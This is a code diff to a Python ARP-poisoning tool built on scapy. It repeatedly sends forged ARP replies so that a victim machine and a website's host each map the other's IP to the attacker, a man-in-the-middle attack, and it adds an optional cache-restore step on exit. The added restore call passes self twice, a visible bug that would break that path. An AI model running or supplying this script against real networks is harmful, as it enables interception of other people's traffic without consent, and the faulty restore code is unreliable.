@@ -20,20 +20,35 @@ class ARPPoison:
     def poison(self, target, pretend, MAC):
         # Note: Ignore warning when running, adding Ether 'hwdst' will break the poisoning
         packet = scapy.ARP(op=2, hwdst=MAC, pdst=target, psrc=pretend)
-        scapy.send(packet, iface=self.iface, verbose=False)
+        scapy.send(packet, iface=self.iface)
         print(f"> Poisoning {target} as {pretend}")
+    
+    def restore_tables(self, ptarget1, ptarget2, hwt1, hwt2):
+        pkt = scapy.ARP(op=2, pdst=ptarget1, hwdst=hwt1, psrc=ptarget2, hwsrc=hwt2)
+        scapy.send(pkt, iface=self.iface)
+        pkt = scapy.ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
+        scapy.send(pkt, iface=self.iface)
+        print("> ARP tables restored. Exiting...")
         
     def attack(self):
         self.set_mac()
-        while True:
-            self.poison(self.victimIP, self.websiteIP, self.victimMAC)
-            self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
-            time.sleep(1.0)
+        try:
+            while True:
+                self.poison(self.victimIP, self.websiteIP, self.victimMAC)
+                self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
+                time.sleep(1.0)
+        except KeyboardInterrupt:
+            restore = input("> Restore ARP tables? [Y/N]")
+            if restore == 'y' or restore == 'Y' or restore == 'yes' or restore == 'Yes' or restore == 'YES':
+                self.restore_tables(self, self.victimIP, self.websiteIP, self.victimMAC, self.websiteMAC)
+            else:
+                print("> Exiting...")
 
 if __name__ == "__main__":
     iface = input("> Interface: ")
     victim = input("> Victim IP: ")
     site = input("> Website IP: ")
+    # Also implement timer (how often to send)
 
     spoofer = ARPPoison(iface, victim, site)
     spoofer.attack()
